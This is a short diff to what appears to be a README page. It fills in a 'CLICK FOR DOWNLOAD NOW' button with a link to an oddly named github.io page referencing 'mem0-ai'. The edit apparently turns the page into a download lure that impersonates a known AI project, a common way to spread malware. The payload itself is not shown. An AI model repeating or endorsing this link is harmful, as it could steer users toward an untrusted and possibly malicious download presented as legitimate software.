@@ -4,7 +4,7 @@
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://Cockatricekofurnace.github.io/mem0-ai-wv86/ ) |
  |---------------------|----------------------:|
 
 
